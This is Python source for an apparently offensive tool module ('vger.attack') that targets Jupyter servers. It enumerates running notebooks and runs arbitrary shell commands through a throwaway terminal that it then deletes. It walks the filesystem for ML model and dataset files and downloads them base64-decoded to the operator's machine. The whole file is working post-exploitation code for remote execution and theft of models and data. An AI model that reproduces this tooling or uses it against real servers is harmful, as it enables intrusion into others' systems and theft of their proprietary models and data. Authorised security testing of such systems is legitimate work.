import inquirer
import asyncio
from vger.attack import run_ephemeral_terminal
import json
import base64


class EnumerateMixin:
    def pick_target(self):
        """
        Select a specific notebook to target on the server (required for some operations).
        """
        session_info = dict()
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) == 0:
            self.connection.print_with_rule("No running notebooks to attach to")
        else:
            for s in self.sessions:
                name = self.connection.jpy_sessions[s]["name"]
                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
                session_info[f"{name:<20} {last_active:<30}"] = s
            select_kernel = [
                inquirer.List(
                    "kernel",
                    message="Which notebook would you like to attach to?",
                    choices=session_info.keys(),
                )
            ]
            answer = inquirer.prompt(select_kernel)
            self.target = session_info[answer["kernel"]]
        return len(self.sessions)

    def run_in_shell(self):
        """
        Launches a Jupyter Terminal, runs the command, and deletes the Terminal.
        """
        code = [inquirer.Text("code", "What shell command would you like to run?")]
        answers = inquirer.prompt(code)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            run_ephemeral_terminal(self.connection, answers["code"])
        )

    def list_notebooks(self):
        """
        List running notebooks.
        """
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) > 0:
            printable_sessions = [
                f"{self.connection.jpy_sessions[s]['name']:<20} Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']:<30}"
                for s in self.connection.jpy_sessions
            ]
            self.connection.print_with_rule("\n".join(printable_sessions))
        else:
            self.connection.print_with_rule("No running notebooks")

    def list_dir(self):
        """
        List directory contents.
        Can also be used to get file contents.
        """
        dir = [
            inquirer.Text(
                "dir",
                "What directory or file would you like to list?",
                default="/",
            )
        ]
        answers = inquirer.prompt(dir)
        results = self.connection.list_dir(answers["dir"])
        with self.connection.con.pager():
            self.connection.print_with_rule(json.dumps(results), json=True)

    def find_files(
        self,
        file_extensions,
        tracker,
        path="/",
    ):
        """
        Search for files based on known file extensions.
        """
        try:
            for file in self.connection.list_dir(path)["content"]:
                if file["type"] == "directory":
                    self.find_files(file_extensions, tracker, file["path"])
                elif (
                    file["type"] == "file"
                    and file["name"].split(".")[-1] in file_extensions
                ):
                    self.connection.print_with_rule(f"Found {file["path"]}")
                    tracker.append(file["path"])
                else:
                    pass
        except KeyError:
            pass

    def find_files_runner(self, file_type="model"):
        """
        find_files() is recursive, this manages the loop.
        """
        if file_type == "model":
            file_extensions = [
                "pkl",
                "pickle",
                "pt",
                "pth",
                "onnx",
                "safetensors",
                "h5",
                "npy",
                "npz",
                "joblib",
                "pb",
                "protobuf",
                "zip",
                "bin",
            ]
            tracker = self.model_paths
        elif file_type == "data":
            file_extensions = ["csv", "json", "jsonl", "parquet", "avro"]
            tracker = self.datasets
        answer = [
            inquirer.Text(
                "path", "What path would you like to recursively search?", default="/"
            ),
            inquirer.Checkbox(
                "extensions",
                "What extensions would you like to search for?",
                choices=file_extensions,
                default=file_extensions,
            ),
        ]
        answer = inquirer.prompt(answer)
        with self.connection.con.status("Searching..."):
            self.find_files(answer["extensions"], tracker, answer["path"])

    def download_files(self, tracker):
        """
        Download discovered artifacts.
        """
        if len(tracker) == 0:
            self.connection.print_with_rule(
                f"You need to find some artifacts first.\nTry Enumerate -> Find [artifact]"
            )
            self.exploit()
        else:
            answer = [
                inquirer.Path(
                    "path",
                    message="What directory would you like to download to?",
                    path_type=inquirer.Path.DIRECTORY,
                    exists=True,
                ),
                inquirer.Checkbox(
                    "artifacts", "What do you want?", choices=tracker, default=tracker
                ),
            ]
            answer = inquirer.prompt(answer)
            path = answer["path"].split("? ")[-1]
            for artifact in answer["artifacts"]:
                name = artifact.split("/")[-1]
                with open(f"{path + name}", "wb") as f:
                    f.write(
                        base64.b64decode(self.connection.list_dir(artifact)["content"])
                    )
                self.connection.print_with_rule(f"{name} downloaded to {path}")
